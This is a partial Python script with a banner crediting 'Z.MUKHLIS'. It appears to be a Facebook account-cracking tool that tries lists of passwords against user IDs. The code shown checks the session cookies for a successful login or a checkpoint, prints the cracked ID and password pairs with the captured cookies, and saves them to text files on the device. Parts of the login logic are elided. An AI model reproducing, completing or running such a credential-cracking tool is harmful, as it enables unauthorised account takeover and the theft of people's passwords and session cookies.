...
|  _ <'   |  _  |   | , <     |  _  |     | |     | |
| (_) )   | | | |   | |\`\    | | | |     | |     | |
(____/'   (_) (_)   (_) (_)   (_) (_)     (_)     (_)    \033[1;37m
[+]==============================================
[+] CREATED BY   :  Z.MUKHLIS 
[+] COUNTRY      :  PAKISTAN 
[+] ON GITHUB    :  PATHAN 
[+] TOOL STATUS  :  RANDOM
[+] TOOL VERSION :  7.0
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[KPK-OK🌻] {uid}|{ps}")
                print(f"\n[COOKIE🎁] : {coki}")
                open('/sdcard/KPK/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[KPK-CP❌] {uid}|{ps}")
                open('/sdcard/KPK-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[KPK💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
